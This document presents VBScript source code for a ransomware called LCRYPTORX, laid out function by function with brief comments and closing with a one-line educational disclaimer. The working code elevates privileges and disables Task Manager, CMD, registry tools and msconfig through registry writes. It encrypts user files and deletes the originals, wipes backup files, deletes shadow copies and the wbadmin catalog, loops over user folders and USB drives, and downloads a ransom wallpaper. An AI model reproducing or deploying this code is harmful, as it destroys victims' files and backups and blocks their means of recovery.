
# 🧠 Annotated Source Code - LCRYPTORX Ransomware (VBScript)

This document provides enhanced and fully commented source code for the LCRYPTORX ransomware functions.

---

## 📌 Function: PrivilegeEscalation

```vbscript
If Not WScript.Arguments.Named.Exists("elevated") Then
    ' Create Shell object to elevate privileges
    Set objShell = CreateObject("Shell.Application")
    objShell.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " /elevated", "", "runas", 1
    WScript.Quit
End If
```

---

## 📌 Function: DisableSecurityTools

```vbscript
Set WshShell = CreateObject("WScript.Shell")
On Error Resume Next

' Disable Task Manager
WshShell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD"

' Disable common system utilities and security tools
WshShell.RegWrite "HKLM\Software\Policies\Microsoft\Windows\System\DisableCMD", 1, "REG_DWORD"
WshShell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", 1, "REG_DWORD"
WshShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoControlPanel", 1, "REG_DWORD"

' Prevent execution of critical tools
WshShell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun", 1, "REG_DWORD"
WshShell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\1", "msconfig.exe", "REG_SZ"
```

---

## 📌 Function: GenerateRandomKey

```vbscript
Function GenerateRandomKey(length)
    Dim randomKey, i, charSet
    randomKey = ""
    charSet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$_&-+()/§?!*"
    
    ' Generate a pseudo-random string of given length
    For i = 1 To length
        randomKey = randomKey & Mid(charSet, Int((Len(charSet) * Rnd) + 1), 1)
    Next
    
    GenerateRandomKey = randomKey
End Function
```

---

## 📌 Function: XOREncryptDecrypt

```vbscript
Function XOREncryptDecrypt(inputText, key)
    Dim outputText, i, keyChar
    outputText = ""
    
    ' Simple XOR cipher using repeating key
    For i = 1 To Len(inputText)
        keyChar = Mid(key, ((i - 1) Mod Len(key)) + 1, 1)
        outputText = outputText & Chr(Asc(Mid(inputText, i, 1)) Xor Asc(keyChar))
    Next

    XOREncryptDecrypt = outputText
End Function
```

---

## 📌 Function: CaesarEncryptDecrypt

```vbscript
Function CaesarEncryptDecrypt(inputText, shift)
    Dim result, i, currentChar, newChar
    result = ""

    ' Caesar cipher shift using ASCII mod 256
    For i = 1 To Len(inputText)
        currentChar = Mid(inputText, i, 1)
        newChar = Chr((Asc(currentChar) + shift) Mod 256)
        result = result & newChar
    Next

    CaesarEncryptDecrypt = result
End Function
```

---

## 📌 Function: EncryptFile

```vbscript
Function EncryptFile(filePath, encryptionKey)
    Dim objFile, fileContent, encryptedContent, salt

    ' Avoid encrypting known system or ransom files
    If LCase(Right(filePath, Len(strNewExtension) + 1)) = "." & strNewExtension Then Exit Function

    Set objFile = objFSO.OpenTextFile(filePath, 1)
    If Err.Number <> 0 Then Err.Clear : Exit Function

    fileContent = objFile.ReadAll
    objFile.Close

    salt = GenerateRandomKey(32)
    
    ' Encrypt with XOR + Caesar + Salt
    encryptedContent = XOREncryptDecrypt(fileContent, CaesarEncryptDecrypt(encryptionKey, 137) & salt)

    Set objFile = objFSO.CreateTextFile(filePath & "." & strNewExtension, True)
    objFile.Write AddLineBreaks(encryptedContent, 327)
    objFile.Close

    objFSO.DeleteFile(filePath)
End Function
```

---

## 📌 Function: DeleteBackupCatalog

```vbscript
Sub DeleteBackupCatalog(folderPath)
    Dim objFolder, objFile, fileExtension
    Set objFolder = objFSO.GetFolder(folderPath)

    For Each objFile In objFolder.Files
        fileExtension = LCase(objFSO.GetExtensionName(objFile.Path))
        If fileExtension = "bak" Or fileExtension = "backup" Or fileExtension = "old" Then
            objFSO.DeleteFile objFile.Path
        End If
    Next

    ' Recursive scan
    Dim objSubfolder
    For Each objSubfolder In objFolder.Subfolders
        DeleteBackupCatalog objSubfolder.Path
    Next
End Sub
```

---

## 📌 Function: DeleteShadowCopiesAndCatalog

```vbscript
Sub DeleteShadowCopiesAndCatalog
    Dim cmdDeleteShadow, cmdDeleteWbAdmin
    cmdDeleteShadow = "cmd.exe /c vssadmin delete shadows /all /quiet"
    cmdDeleteWbAdmin = "cmd.exe /c wbadmin delete catalog -quiet"

    objShell.Run cmdDeleteShadow, 0, True
    objShell.Run cmdDeleteWbAdmin, 0, True
End Sub
```

---

## 📌 Function: MonitorFolders

```vbscript
Sub MonitorFolders()
    Do
        ProcessFolder strDesktop
        ProcessFolder strDocuments
        ProcessFolder strPictures
        ' Additional folders...
        ProcessUSBDrives
        DeleteBackupCatalog strDesktop
        ' Additional folders...
        WScript.Sleep 2000
    Loop
End Sub
```

---

## 📌 Function: DownloadAndSetWallpaper

```vbscript
Sub DownloadAndSetWallpaper(url)
    Dim wallpaperPath
    wallpaperPath = objShell.SpecialFolders("Desktop") & "\gcrybground.png"

    If CheckInternet() Then
        DownloadFile url, wallpaperPath
        SetWallpaper wallpaperPath
    End If
End Sub
```

---

## 📌 Function: CheckInternet

```vbscript
Function CheckInternet()
    Dim objXML
    On Error Resume Next
    Set objXML = CreateObject("MSXML2.ServerXMLHTTP")
    objXML.Open "GET", "http://www.google.com", False
    objXML.Send
    CheckInternet = (objXML.Status = 200)
    On Error GoTo 0
    Set objXML = Nothing
End Function
```

---

## 📌 Function: DownloadFile

```vbscript
Sub DownloadFile(url, localPath)
    Dim objXML, objStream
    Set objXML = CreateObject("MSXML2.ServerXMLHTTP")
    Set objStream = CreateObject("ADODB.Stream")

    objXML.Open "GET", url, False
    objXML.Send

    If objXML.Status = 200 Then
        objStream.Open
        objStream.Type = 1
        objStream.Write objXML.ResponseBody
        objStream.SaveToFile localPath, 2
        objStream.Close
    End If

    Set objStream = Nothing
    Set objXML = Nothing
End Sub
```

---

*This document is for malware analysis and educational purposes only.*
